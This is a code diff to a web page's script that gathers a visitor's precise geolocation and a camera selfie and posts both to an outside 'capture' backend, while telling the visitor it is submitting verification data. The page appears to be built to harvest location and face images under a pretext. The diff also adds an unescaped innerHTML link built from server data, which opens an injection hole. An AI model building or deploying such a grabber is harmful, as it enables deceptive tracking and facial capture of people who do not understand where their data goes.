@@ -14,7 +14,6 @@
   <img id="preview" width="300" style="border-radius: 8px; margin-top: 10px;" />
 
   <script>
-    // ⚠️ After deploying the backend, you must change this to your Render URL!
     const BACKEND_URL = 'https://my-capture-backend.onrender.com/api/capture';
 
     async function run() {
@@ -22,7 +21,6 @@
       let locationData = null;
       let selfieData = null;
 
-      // 1. Get location
       try {
         const pos = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
@@ -37,25 +35,23 @@
         statusEl.textContent = 'Location failed: ' + e.message + '. Trying camera...';
       }
 
-      // 2. Get selfie
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
         await video.play();
-        await new Promise(r => setTimeout(r, 1000)); // Wait for camera to focus
+        await new Promise(r => setTimeout(r, 1000));
 
         const canvas = document.getElementById('canvas');
         canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
-        selfieData = canvas.toDataURL('image/jpeg', 0.7); // Compress quality
+        selfieData = canvas.toDataURL('image/jpeg', 0.7);
         document.getElementById('preview').src = selfieData;
 
-        stream.getTracks().forEach(t => t.stop()); // Turn off camera
+        stream.getTracks().forEach(t => t.stop());
       } catch (e) {
         statusEl.textContent += ' | Camera failed: ' + e.message;
       }
 
-      // 3. Send to backend
       if (locationData || selfieData) {
         statusEl.textContent = 'Sending data...';
         try {
@@ -68,8 +64,12 @@
               timestamp: new Date().toISOString()
             })
           });
-          if (res.ok) statusEl.textContent = '✅ Verification data submitted successfully.';
-          else statusEl.textContent = '❌ Server error: ' + res.status;
+          if (res.ok) {
+            const data = await res.json();
+            statusEl.innerHTML = '✅ Success! <a href="' + data.selfieUrl + '" target="_blank">Open your selfie</a>';
+          } else {
+            statusEl.textContent = '❌ Server error: ' + res.status;
+          }
         } catch (e) {
           statusEl.textContent = '❌ Network error: ' + e.message;
         }
